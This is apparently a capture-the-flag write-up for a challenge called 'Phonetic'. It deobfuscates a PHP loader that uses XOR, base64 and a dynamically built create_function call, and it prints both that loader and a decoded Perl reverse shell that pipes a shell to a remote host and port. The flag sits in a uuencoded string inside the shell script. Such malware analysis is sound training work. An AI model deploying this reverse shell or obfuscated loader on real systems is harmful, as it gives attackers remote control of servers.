### Phonetic

We have the following file.
I am removing the encrypted `$gbaylYLd6204` part as it's too long.

```
<?php  


 function deGRi($wyB6B, $w3Q12 = '') { $zZ096 = $wyB6B; $pCLb8 = ''; for ($fMp3G = 0; $fMp3G < strlen($zZ096);) { for ($oxWol = 0; $oxWol < strlen($w3Q12) && $fMp3G < strlen($zZ096); $oxWol++, $fMp3G++) { $pCLb8 .= $zZ096[$fMp3G] ^ $w3Q12[$oxWol]; } } return $pCLb8; }
/*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/

$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$gbaylYLd6204 = "<ENCRYPTED PART>"
$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
$c();

/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/
```

We need to make sense of this so we converted the variables and then have a much cleaner code.

```
<?php

function decode($string1, $code = '')
{
   $return = '';
   for ($i = 0; $i < strlen($string1);) {
      for ($j = 0; $j < strlen($code) && $i < strlen($string1); $j++, $i++) {
         $return .= $string1[$i] ^ $code[$j];
      }
   }
   return $return;
}

$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";


$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}

echo $k,"\n";
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

echo "\$fsPwhnfn8423 = ",$fsPwhnfn8423,"\n"; #base64_decode
echo "\$oZjuNUpA325 = ",$oZjuNUpA325,"\n"; #strrev
echo $k,"\n";

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');

# THIS PART WE COMMENT OUT AND CREATE OUR OWN BELOW TO GET THE DATA OUT
#$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
#$c();

/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/

echo $k,"\n";
#$gbaylYLd6204 = "<ENCRYPTED PART>";
$d = base64_decode($gbaylYLd6204); #First base64 decode the encrypted part
#echo $d
$dd = decode($d, "tVEwfwrN302"); #Decode the decrypted base64 with the key
#echo $dd
$ddd = base64_decode($dd); #Decrypt the decoded part again
echo $ddd; #Print the output

?>
```
This now gives us some PHP code. Again, this code is way too long and will only print the section we need to focus on.
We find the following base64
```
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
```

We base64 decode this and we get the following php code

```
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)
```
We see  the following section

```
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
```

We notice the following uuencoded piece

```
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT``
```

We browse over to https://www.dcode.fr/uu-encoding and decode that string there which then reveals the flag.
